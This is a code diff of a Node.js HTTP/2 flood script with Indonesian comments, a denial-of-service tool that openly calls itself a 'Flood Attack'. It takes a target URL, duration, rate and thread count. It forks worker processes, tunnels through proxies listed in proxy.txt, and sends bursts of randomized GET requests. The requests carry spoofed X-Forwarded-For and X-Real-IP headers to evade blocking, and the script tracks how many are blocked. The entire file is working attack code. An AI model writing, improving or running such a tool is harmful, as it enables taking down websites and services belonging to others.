@@ -6,141 +6,346 @@ const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 
-// --- [ CONFIGURATION & FAILSAFE ] ---
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 
-if (process.argv.length < 5) {
-    console.log(`\x1b[31m[!] REX-EYE ERROR\x1b[0m\nUsage: node raw.js <url> <time> <rate> <threads> [--noproxy]`);
+if (process.argv.length < 5){
+    console.log(`Usage: node raw js url time rate threads\nExample: node tls.js https://example.com/ 120 16 4`); 
+    console.log(`Atau tanpa proxy: node raw.js https://example.com/ 120 16 4 --noproxy`);
     process.exit();
 }
 
-const targetURL = process.argv[2];
-const parsedTarget = url.parse(targetURL);
+// Cek apakah menggunakan proxy atau langsung
 const useProxy = process.argv[6] !== "--noproxy";
 
-// --- [ 1. MASSIVE USER-AGENT DATABASE (Suntikan biar file berat) ] ---
-// Gue kasih contoh dikit, lu copy-paste sampe ribuan baris biar tembus 30KB!
-const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
-    // [ISI SENDIRI SAMPE 5000 BARIS DISINI]
-];
+// Support TLS 1.2 dan 1.3
+const ciphersTLS12 = [
+    "TLS_AES_256_GCM_SHA384",
+    "TLS_AES_128_GCM_SHA256",
+    "TLS_CHACHA20_POLY1305_SHA256",
+    "ECDHE-ECDSA-AES128-GCM-SHA256",
+    "ECDHE-RSA-AES128-GCM-SHA256",
+    "ECDHE-ECDSA-AES256-GCM-SHA384",
+    "ECDHE-RSA-AES256-GCM-SHA384",
+    "ECDHE-ECDSA-CHACHA20-POLY1305",
+    "ECDHE-RSA-CHACHA20-POLY1305"
+].join(":");
 
-const acceptLanguages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.9,en-US;q=0.8", "fr-FR,fr;q=0.9", "ja-JP,ja;q=0.8"];
+const ecdhCurve = "x25519:secp256r1:secp384r1";
 
-// --- [ 2. CORE ENGINE ] ---
-let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };
-var proxyList = [];
+const secureOptions = 
+ crypto.constants.SSL_OP_NO_SSLv2 |
+ crypto.constants.SSL_OP_NO_SSLv3 |
+ crypto.constants.SSL_OP_NO_TLSv1 |
+ crypto.constants.SSL_OP_NO_TLSv1_1 |
+ crypto.constants.ALPN_ENABLED |
+ crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;
+
+const secureContextOptions = {
+    ciphers: ciphersTLS12,
+    honorCipherOrder: true,
+    secureOptions: secureOptions,
+    minVersion: "TLSv1.2",
+    maxVersion: "TLSv1.3"
+};
+
+const secureContext = tls.createSecureContext(secureContextOptions);
+
+// Load proxies jika ada
+var proxies = [];
+if (useProxy) {
+    try {
+        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
+        console.log(`📡 Loaded ${proxies.length} proxies`);
+    } catch(e) {
+        console.log(`⚠️  No proxy.txt found, using direct connection`);
+    }
+}
+
+// User Agent default jika diperlukan
+const defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+
+const args = {
+    target: process.argv[2],
+    time: ~~process.argv[3],
+    Rate: ~~process.argv[4],
+    threads: ~~process.argv[5]
+}
+
+const parsedTarget = url.parse(args.target);
+
+// Statistik global
+let stats = {
+    total: 0,
+    success: 0,
+    blocked: 0,
+    error: 0,
+    active: 0
+};
 
 if (cluster.isMaster) {
-    console.log(`\x1b[35m[REX-EYE]\x1b[0m VOID CONTROL ACTIVE | \x1b[36m${targetURL}\x1b[0m`);
+    console.log(`🔥 Starting Flood Attack`);
+    console.log(`🎯 Target: ${args.target}`);
+    console.log(`⏱️  Duration: ${args.time} seconds`);
+    console.log(`⚡ Rate: ${args.Rate} req/sec per connection`);
+    console.log(`🧵 Threads: ${args.threads}`);
+    console.log(`🔒 TLS Version: 1.2 & 1.3`);
+    console.log(`🌐 Proxy Mode: ${useProxy ? "Enabled" : "Disabled"}`);
+    console.log(`====================================`);
     
-    if (useProxy) {
-        try {
-            if (fs.existsSync("proxy.txt")) {
-                proxyList = fs.readFileSync("proxy.txt", "utf-8").split(/\r?\n/).filter(l => l.trim());
-                console.log(`\x1b[32m[+]\x1b[0m Loaded ${proxyList.length} Proxies`);
-            } else {
-                console.log(`\x1b[33m[!]\x1b[0m proxy.txt not found! Switching to direct mode.`);
-            }
-        } catch(e) {
-            console.log(`\x1b[31m[!] Error reading proxy.txt\x1b[0m`);
-        }
+    // Live stats setiap 3 detik
+    const statsInterval = setInterval(() => {
+        console.log(`\n📊 STATS UPDATE [${new Date().toLocaleTimeString()}]:`);
+        console.log(`   Total: ${stats.total}`);
+        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
+        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
+        console.log(`   ❌ Error: ${stats.error}`);
+        console.log(`   🔗 Active: ${stats.active}`);
+    }, 3000);
+    
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
     }
-
-    for (let i = 0; i < ~~process.argv[5]; i++) cluster.fork();
-
+    
     setTimeout(() => {
-        console.log(`\x1b[32m[✔]\x1b[0m Mission Finished.`);
+        clearInterval(statsInterval);
+        console.log(`\n✅ Attack Finished!`);
+        console.log(`📊 Final Stats:`);
+        console.log(`   Total Requests: ${stats.total}`);
+        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
+        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
+        console.log(`   ❌ Error: ${stats.error}`);
         process.exit(1);
-    }, ~~process.argv[3] * 1000);
+    }, args.time * 1000);
 } else {
-    // RE-LOAD PROXY DI WORKER (FAILSAFE UNTUK CODESPACES)
-    if (useProxy && fs.existsSync("proxy.txt")) {
-        proxyList = fs.readFileSync("proxy.txt", "utf-8").split(/\r?\n/).filter(l => l.trim());
+    // Worker processes
+    console.log(`Worker ${cluster.worker.id} started`);
+    
+    // Multiple intervals per worker untuk rate yang lebih tinggi
+    const intervalsPerWorker = Math.min(2000, args.Rate);
+    for (let i = 0; i < intervalsPerWorker; i++) {
+        setTimeout(() => {
+            setInterval(() => {
+                if (stats.active < 10000) {
+                    runFlooder();
+                }
+            }, Math.max(1, Math.floor(1000 / (args.Rate / intervalsPerWorker))));
+        }, i * 1);
     }
+}
 
-    setInterval(() => {
-        if (stats.active < 5000) runFlooder();
-    }, 1);
+function randomIntn(min, max) {
+    return Math.floor(Math.random() * (max - min) + min);
+}
+
+function randomElement(elements) {
+    if (!elements || elements.length === 0) return "";
+    return elements[randomIntn(0, elements.length)];
+}
+
+function randomString(length) {
+    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    let result = "";
+    for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+function randomIP() {
+    return randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255);
 }
 
 function runFlooder() {
     stats.active++;
     
-    // FIX ERROR SCREENSHOT: Cek length dulu sebelum akses array
-    const proxy = (useProxy && proxyList.length > 0) ? proxyList[Math.floor(Math.random() * proxyList.length)] : null;
+    const makeRequest = (proxyConn) => {
+        const settings = {
+            enablePush: false,
+            initialWindowSize: 2147483647,
+            maxConcurrentStreams: 1000
+        };
 
-    const makeRequest = (conn) => {
-        const tlsConn = tls.connect(443, parsedTarget.host, {
-            socket: conn,
-            ALPNProtocols: ["h2"],
-            servername: parsedTarget.host,
+        const tlsOptions = {
+            port: 443,
+            ALPNProtocols: ["h2", "http/1.1"],
+            ciphers: ciphersTLS12,
+            requestCert: false,
+            ecdhCurve: ecdhCurve,
+            honorCipherOrder: true,
+            host: parsedTarget.host,
             rejectUnauthorized: false,
+            secureOptions: secureOptions,
+            secureContext: secureContext,
+            servername: parsedTarget.host,
             minVersion: "TLSv1.2",
-            maxVersion: "TLSv1.3",
-            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256"
-        }, () => {
+            maxVersion: "TLSv1.3"
+        };
+
+        // Jika ada proxy connection, gunakan socket dari proxy
+        if (proxyConn) {
+            tlsOptions.socket = proxyConn;
+        }
+
+        const tlsConn = proxyConn ? 
+            tls.connect(443, parsedTarget.host, tlsOptions) :
+            tls.connect(443, parsedTarget.host, tlsOptions);
+
+        tlsConn.setNoDelay(true);
+        tlsConn.setKeepAlive(true, 60000);
+        tlsConn.setMaxListeners(0);
+
+        let requestInterval;
+        
+        tlsConn.once("secureConnect", () => {
             const client = http2.connect(parsedTarget.href, {
+                protocol: "https:",
+                settings: settings,
                 createConnection: () => tlsConn,
-                settings: { 
-                    enablePush: false, 
-                    initialWindowSize: 1073741823, 
-                    maxConcurrentStreams: 1000 
-                }
+                maxSessionMemory: 1000
             });
 
-            for (let i = 0; i < ~~process.argv[4]; i++) {
+            client.setMaxListeners(0);
+            
+            const startTime = Date.now();
+            
+            requestInterval = setInterval(() => {
+                const elapsed = Date.now() - startTime;
+                if (elapsed > args.time * 1000) {
+                    clearInterval(requestInterval);
+                    client.destroy();
+                    if (proxyConn) proxyConn.destroy();
+                    stats.active--;
+                    return;
+                }
+                
+                // Kirim request
+                const randomPath = parsedTarget.path + 
+                    (Math.random() > 0.5 ? "?" + randomString(8) + "=" + randomString(6) : "");
+                
                 const headers = {
                     [":method"]: "GET",
-                    [":path"]: parsedTarget.path + "?" + crypto.randomBytes(6).toString('hex'),
+                    [":path"]: randomPath,
                     [":scheme"]: "https",
                     [":authority"]: parsedTarget.host,
-                    "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
-                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                    "accept-encoding": "gzip, deflate, br, zstd",
-                    "accept-language": acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
-                    "sec-ch-ua": '"Chromium";v="122", "Google Chrome";v="122"',
-                    "sec-ch-ua-platform": '"Windows"',
-                    "sec-fetch-dest": "document",
-                    "sec-fetch-mode": "navigate",
-                    "sec-fetch-site": "none",
-                    "cache-control": "no-cache"
+                    "user-agent": defaultUserAgent,
+                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "accept-language": "en-US,en;q=0.9",
+                    "accept-encoding": "gzip, deflate, br",
+                    "cache-control": "no-cache",
+                    "pragma": "no-cache",
+                    "referer": "https://" + parsedTarget.host,
+                    "x-forwarded-for": randomIP(),
+                    "x-real-ip": randomIP()
                 };
-
-                const req = client.request(headers);
-                req.setPriority({ weight: 256, exclusive: true });
-
-                req.on("response", (res) => {
+                
+                try {
+                    const request = client.request(headers);
+                    request.on("response", (responseHeaders) => {
+                        const statusCode = responseHeaders[":status"];
+                        stats.total++;
+                        
+                        if (statusCode === 200 || statusCode === 301 || statusCode === 302) {
+                            stats.success++;
+                        } else if (statusCode === 403 || statusCode === 503 || statusCode === 429) {
+                            stats.blocked++;
+                        } else {
+                            stats.error++;
+                        }
+                        
+                        request.close();
+                        request.destroy();
+                    });
+                    request.on("error", () => {
+                        stats.total++;
+                        stats.error++;
+                    });
+                    request.end();
+                } catch(e) {
                     stats.total++;
-                    if (res[":status"] === 200) stats.success++;
-                    else stats.blocked++;
-                    req.close();
-                });
-
-                req.on("error", () => { stats.error++; req.destroy(); });
-                req.end();
-            }
-
-            setTimeout(() => { client.destroy(); tlsConn.destroy(); stats.active--; }, 5000);
+                    stats.error++;
+                }
+            }, Math.max(10, Math.floor(1000 / args.Rate)));
+            
+            client.requestInterval = requestInterval;
         });
 
-        tlsConn.on("error", () => { tlsConn.destroy(); stats.active--; });
+        tlsConn.on("error", (err) => {
+            if (requestInterval) clearInterval(requestInterval);
+            if (proxyConn) proxyConn.destroy();
+            stats.active--;
+        });
+        
+        if (proxyConn) {
+            proxyConn.on("error", () => {
+                if (requestInterval) clearInterval(requestInterval);
+                tlsConn.destroy();
+                stats.active--;
+            });
+            
+            proxyConn.on("close", () => {
+                if (requestInterval) clearInterval(requestInterval);
+                stats.active--;
+            });
+        }
+        
+        tlsConn.on("close", () => {
+            if (requestInterval) clearInterval(requestInterval);
+            stats.active--;
+        });
     };
-
-    if (useProxy && proxy) {
-        const [phost, pport] = proxy.split(":");
-        const pSocket = net.connect(~~pport, phost);
-        pSocket.once("connect", () => {
-            pSocket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\n\r\n`);
-        });
-        pSocket.on("data", (d) => { if (d.toString().includes("200")) makeRequest(pSocket); else pSocket.destroy(); });
-        pSocket.on("error", () => { pSocket.destroy(); stats.active--; });
-    } else {
-        makeRequest(null);
+    
+    // Jika menggunakan proxy
+    if (useProxy && proxies.length > 0) {
+        const proxyAddr = randomElement(proxies);
+        if (proxyAddr) {
+            const parsedProxy = proxyAddr.split(":");
+            if (parsedProxy.length >= 2) {
+                const proxyConn = net.connect({
+                    host: parsedProxy[0],
+                    port: ~~parsedProxy[1],
+                    allowHalfOpen: true
+                });
+                
+                proxyConn.setTimeout(10000);
+                proxyConn.setKeepAlive(true, 30000);
+                
+                const payload = "CONNECT " + parsedTarget.host + ":443 HTTP/1.1\r\nHost: " + parsedTarget.host + "\r\nUser-Agent: " + defaultUserAgent + "\r\n\r\n";
+                
+                proxyConn.on("connect", () => {
+                    proxyConn.write(payload);
+                });
+                
+                proxyConn.on("data", (chunk) => {
+                    const response = chunk.toString();
+                    if (response.includes("200 Connection established") || response.includes("HTTP/1.1 200")) {
+                        proxyConn.removeAllListeners("data");
+                        makeRequest(proxyConn);
+                    } else {
+                        proxyConn.destroy();
+                        stats.active--;
+                    }
+                });
+                
+                proxyConn.on("error", () => {
+                    stats.active--;
+                });
+                
+                proxyConn.on("timeout", () => {
+                    proxyConn.destroy();
+                    stats.active--;
+                });
+                
+                return;
+            }
+        }
     }
+    
+    // Direct connection (tanpa proxy)
+    makeRequest(null);
 }
+
+process.on('uncaughtException', (error) => {
+    if (stats.active > 0) stats.active--;
+});
+process.on('unhandledRejection', (error) => {});
